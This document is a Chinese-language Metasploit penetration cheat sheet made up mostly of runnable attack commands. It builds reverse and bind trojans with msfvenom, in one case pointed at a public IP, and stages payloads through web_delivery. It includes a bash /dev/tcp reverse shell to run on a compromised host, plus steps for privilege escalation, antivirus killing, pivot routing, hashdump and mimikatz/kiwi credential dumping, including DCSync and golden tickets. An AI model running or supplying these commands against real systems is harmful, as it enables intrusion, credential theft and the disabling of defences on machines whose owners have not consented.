###  渗透

```bash
msfdb run # 启动数据库并启动 msfconsole

# msfvenom 生成木马
# 生成exe反向连接木马
msfvenom -p windows/meterpreter/reverse_tcp LHOST=182.92.161.222 LPORT=4444 -f exe -o win_re_x64.exe
# 生成exe正向连接木马
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=182.92.161.222 LPORT=4444 -f exe -o win_bind_x64.exe
# 生成elf正向连接木马 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=182.92.161.222 LPORT=4444 -f elf -o linux_re_x64
# 生成elf正向连接木马
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=182.92.161.222 LPORT=4444 -f elf -o linux_bind_x64
# msi木马
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.10 lport=4444 -f msi -o eval.msi

# web_delivery模块进行出网投送，一般配合计划任务执行
use exploit/multi/script/web_delivery
set target 6    # 选择目标系统
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.1.7
set lport 4444
exploit

# 添加路由
# 内网中添加路由主要是充当跳板功能， 其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往内网的路由，此路由的下一跳转发，即网关，是MSF攻击平台与被攻击目标建立的一个session会话
# 通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了，那么我们使用msf的强大功能，想干什么就干什么了
run get_local_subnets # 获取目标内网相关信息
run post/multi/manage/autoroute # 添加自动路由
run autoroute -s 10.0.20.0/24 # 配置静态路由
run autoroute -p # 查看路由表
```

**linux bash上线** 

```bash
use exploit/multi/handler
set payload  cmd/unix/reverse_bash
set lport  7777
set lhost  172.16.1.10
run

# 肉鸡执行bash 反弹shell
bash -i >& /dev/tcp/172.16.1.10/7777 0>&1

# 之后再 Ctrl^Z  Y 将sessions置入后台
# 将shell转为meterpreter
use post/multi/manage/shell_to_meterpreter
set lhost   172.16.1.10
set lport   7777
set session 1
run
```

### session构建后的利用

```bash
getsystem # 提升为system权限
sysinfo # 查看主机信息
getuid #命令可以获取当前用户的信息
pwd     #查看当前目录
cd      #切换目标目录；
cat     #读取文件内容；
rm      #删除文件；
edit    #使用vim编辑文件
ls      #获取当前目录下的文件；
mkdir   #新建目录；
rmdir   #删除目录； 
hashdump # 用户哈希

# 进程迁移提权
ps # 获取目标主机正在运行的进程
migrate <pid> # 进程迁移，将shell进程迁移到某个进程里, 例如services.exe
run post/windows/manage/migrate # 自动迁移进程命令

run post/windows/manage/killav # 关闭杀毒软件

# 信息收集
auxiliary/scanner/discovery/arp_sweep    #基于ARP的主机发现
use post/windows/gather/arp_scanner  
auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(1-10000)，如果开放了端口，则说明该主机存活

# msf派生cs会话
# 使用payload-inject把msf的对话派生给cs
use exploit/windows/local/payload_inject
set PAYLOAD windows/meterpreter/reverse_http
set DisablePayloadHandler true
set LHOST 192.168.1.5
set LPORT 5555
set SESSION 2
run

# linux中获取shell的一些方法
python -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
/bin/sh -i


# jobs
jobs -l # 列出后台运行的程序
kill <id> # 关闭job

# 获取自动登录用户密码
run windows/gather/credentials/windows_autologin
```

#### kiwi模块

使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限

```bash
load kiwi # 加载kiwi模块
help kiwi # 查看kiwi使用

creds_all：# 列举所有凭据
creds_kerberos：# 列举所有kerberos凭据
creds_msv：# 列举所有msv凭据
creds_ssp：# 列举所有ssp凭据
creds_tspkg：# 列举所有tspkg凭据
creds_wdigest：# 列举所有wdigest凭据
dcsync：# 通过DCSync检索用户帐户信息
dcsync_ntlm：# 通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：# 创建黄金票据
kerberos_ticket_list：# 列举kerberos票据
kerberos_ticket_purge：# 清除kerberos票据
kerberos_ticket_use：# 使用kerberos票据
kiwi_cmd：# 执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：# dump出lsa的SAM
lsa_dump_secrets：# dump出lsa的密文
password_change：# 修改密码
wifi_list：# 列出当前用户的wifi配置文件
wifi_list_shared：# 列出共享wifi配置文件/编码

```

